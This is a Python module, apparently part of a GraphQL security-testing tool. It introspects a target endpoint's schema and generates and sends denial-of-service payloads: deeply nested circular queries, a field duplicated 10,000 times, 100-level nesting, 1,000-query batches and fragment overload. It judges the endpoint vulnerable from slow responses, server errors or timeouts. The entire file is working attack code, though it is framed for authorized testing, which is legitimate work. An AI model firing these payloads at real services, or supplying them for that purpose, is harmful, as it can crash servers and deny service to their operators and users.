"""
Version: 1.0
Author:Aleksa Zatezalo
Date: February 2025
Description: GraphQL DoS testing module with schema-aware query generation
"""

import asyncio
import aiohttp
from typing import Dict, List, Optional, Tuple
from grapePrint import grapePrint
import time

class crush():
    """
    A class for testing GraphQL endpoints for various Denial of Service vulnerabilities.
    Generates targeted queries based on introspection of the actual schema.
    """
    
    def __init__(self):
        """Initialize the DoS tester with default settings and printer."""
        self.message = grapePrint()
        self.proxy_url: Optional[str] = None
        self.schema: Optional[Dict] = None
        self.endpoint: Optional[str] = None
        self.query_type: Optional[str] = None
        self.types: Dict[str, Dict] = {}
    

    def printVulnerabilityDetails(self, vuln_type: str, is_vulnerable: bool, duration: float):
        """Print detailed information about the vulnerability test results."""
        if is_vulnerable:
            self.message.printMsg(f"Endpoint is VULNERABLE to {vuln_type}!", status="failed")
            self.message.printMsg(f"Response time: {duration:.2f} seconds", status="failed")
        else:
            self.message.printMsg(f"Endpoint is NOT vulnerable to {vuln_type}", status="success")
            self.message.printMsg(f"Response time: {duration:.2f} seconds", status="success")

    def configureProxy(self, proxy_host: str, proxy_port: int):
        """Configure HTTP proxy settings."""
        self.proxy_url = f"http://{proxy_host}:{proxy_port}"

    async def runIntrospection(self, session: aiohttp.ClientSession) -> bool:
        """
        Run introspection query to get schema information.
        """
        query = """
        query IntrospectionQuery {
          __schema {
            queryType {
              name
            }
            types {
              name
              fields {
                name
                type {
                  name
                  kind
                  ofType {
                    name
                    kind
                  }
                }
              }
            }
          }
        }
        """

        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get('data'):
                        self.schema = result['data']['__schema']
                        self.query_type = self.schema['queryType']['name']
                        
                        # Process types into a more usable format
                        for type_info in self.schema['types']:
                            if type_info.get('fields'):
                                self.types[type_info['name']] = {
                                    'fields': type_info['fields']
                                }
                        
                        return True
                    
            self.message.printMsg("Failed to parse introspection result", status="failed")
            return False
            
        except Exception as e:
            self.message.printMsg(f"Introspection query failed: {str(e)}", status="failed")
            return False

    def generateCircularQuery(self) -> str:
        """
        Generate a deeply nested circular query based on schema types that reference each other.
        Creates a complex recursive query pattern to test for DoS vulnerabilities.
        """
        if not self.schema:
            return ""

        # Get all fields that reference other types
        circular_refs = []
        for type_name, type_info in self.types.items():
            for field in type_info.get('fields', []):
                field_type = field['type'].get('name') or field['type'].get('ofType', {}).get('name')
                if field_type in self.types:
                    circular_refs.append({
                        'type': type_name,
                        'field': field['name'], 
                        'target': field_type
                    })

        if not circular_refs:
            return ""

        # Pick first circular reference to start with
        base_ref = circular_refs[0]
        
        # Create deeply nested query
        nested_query = """
            id
            name 
            description
            createdAt
        """

        # Build up nested levels
        for _ in range(10):
            nested_query = f"""
            {base_ref['field']} {{
                id
                name
                description
                createdAt
                {nested_query}
                {base_ref['field']} {{
                    id
                    name
                    description 
                    {nested_query}
                }}
            }}
            """

        # Duplicate the entire query structure multiple times
        full_query = f"""
        query CircularQuery {{
            {nested_query}
            {nested_query}
            {nested_query}
        }}
        """

        return full_query

    def generateFieldDuplication(self) -> str:
        """
        Generate a query with duplicated fields based on schema.
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""

        # Get all scalar fields from the query type
        scalar_fields = []
        for field in self.types[self.query_type]['fields']:
            field_type = field['type'].get('name')
            if field_type in ['String', 'Int', 'Float', 'Boolean', 'ID']:
                scalar_fields.append(field['name'])

        if not scalar_fields:
            return ""

        # Duplicate the first scalar field many times
        duplicated_field = f"{scalar_fields[0]}\n" * 10000
        return f"query {{ {duplicated_field} }}"

    def generateObjectOverride(self) -> str:
        """
        Generate a deeply nested query based on schema types.
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""

        # Find a field that returns an object type
        object_fields = []
        for field in self.types[self.query_type]['fields']:
            field_type = field['type'].get('name') or field['type'].get('ofType', {}).get('name')
            if field_type in self.types:
                object_fields.append(field['name'])

        if not object_fields:
            return ""

        # Create deeply nested query
        nested_levels = 100
        current_query = "id"
        for _ in range(nested_levels):
            current_query = f"""
            {object_fields[0]} {{
                {current_query}
            }}
            """

        return f"query {{ {current_query} }}"

    def generateArrayBatching(self) -> List[Dict[str, str]]:
        """
        Generate a batch of queries based on schema.
        """
        if not self.query_type or not self.types.get(self.query_type):
            return []

        # Get first available field
        first_field = next(iter(self.types[self.query_type]['fields']), None)
        if not first_field:
            return []

        # Create batch of simple queries
        return [{
            "query": f"""
            query {{
                {first_field['name']} {{
                    id
                }}
            }}
            """
        } for _ in range(1000)]
    
    def generateDirectoryOverload(self) -> str:
        """
        Generate a query that attempts to overload the system by creating deep directory-like structures.
        Creates deeply nested fragments and type combinations to stress the resolver.
        """
        if not self.schema or not self.types:
            return ""

        # Find types that can be nested (have fields that reference other object types)
        nested_types = []
        for type_name, type_info in self.types.items():
            for field in type_info.get('fields', []):
                field_type = field['type'].get('name') or field['type'].get('ofType', {}).get('name')
                if field_type in self.types:
                    nested_types.append({
                        'type': type_name,
                        'field': field['name'],
                        'field_type': field_type
                    })

        if not nested_types:
            return ""

        # Create fragments for each nested type
        fragments = []
        query_fields = []
        
        for i, type_info in enumerate(nested_types[:5]):  # Limit to 5 types to avoid excessive complexity
            fragment_name = f"Frag{i}"
            field_name = type_info['field']
            
            # Create a deeply nested fragment
            inner_fields = """
                id
                name
                createdAt
                updatedAt
            """
            
            # Create nested structure
            for _ in range(5):  # Create 5 levels of nesting
                inner_fields = f"""
                    {field_name} {{
                        {inner_fields}
                        {field_name} {{
                            {inner_fields}
                        }}
                    }}
                """

            # Create fragment
            fragments.append(f"""
            fragment {fragment_name} on {type_info['type']} {{
                {inner_fields}
            }}
            """)
            
            # Add fragment spread to query
            query_fields.append(f"""
            {field_name} {{
                ...{fragment_name}
            }}
            """)

        # Combine everything into a single query
        full_query = f"""
        query DirectoryOverload {{
            {' '.join(query_fields)}
        }}
        
        {' '.join(fragments)}
        """

        return full_query

    async def testDirectoryOverload(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for directory overloading vulnerability using schema-based query."""
        query = self.generateDirectoryOverload()
        if not query:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def setEndpoint(self, endpoint: str, proxy_string: Optional[str] = None) -> bool:
        """
        Set the endpoint and retrieve its schema through introspection.
        
        Args:
            endpoint: The GraphQL endpoint URL
            proxy_string: Optional proxy in format "host:port"
            
        Returns:
            bool: True if endpoint was set and schema retrieved successfully
        """
        self.endpoint = endpoint
        
        # Configure proxy if provided
        if proxy_string:
            try:
                proxy_host, proxy_port = proxy_string.split(':')
                self.configureProxy(proxy_host, int(proxy_port))
            except ValueError:
                self.message.printMsg("Invalid proxy format. Expected host:port", status="failed")
                return False

        # Run introspection
        async with aiohttp.ClientSession() as session:
            return await self.runIntrospection(session)

    async def testCircularQuery(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for circular query vulnerability using schema-based query."""
        query = self.generateCircularQuery()
        if not query:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testFieldDuplication(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for field duplication vulnerability using schema-based query."""
        query = self.generateFieldDuplication()
        if not query:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testArrayBatching(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for array batching vulnerability using schema-based query."""
        queries = self.generateArrayBatching()
        if not queries:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json=queries,
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testEndpointDos(self):
        """
        Test the endpoint for all DoS vulnerabilities using schema-based queries.
        """
        if not self.endpoint or not self.schema:
            self.message.printMsg("No endpoint set or schema not retrieved. Run setEndpoint first.", status="failed")
            return
        
        self.message.printMsg(f"Testing endpoint {self.endpoint} for DOS attacks", status="success")
        self.message.printMsg(f"These tests may crach the application. Please proxy in Burp for further analysis.", status="warning")

        async with aiohttp.ClientSession() as session:
            tests = [
                ("Circular Query DoS", self.testCircularQuery),
                ("Field Duplication DoS", self.testFieldDuplication),
                ("Array Batching DoS", self.testArrayBatching),
                ("Directory Overloading DoS", self.testDirectoryOverload)
            ]
            
            for vuln_type, test_func in tests:
                self.message.printMsg(f"Testing for {vuln_type}...", status="log")
                is_vulnerable, duration = await test_func(session)
                self.printVulnerabilityDetails(vuln_type, is_vulnerable, duration)
                await asyncio.sleep(10)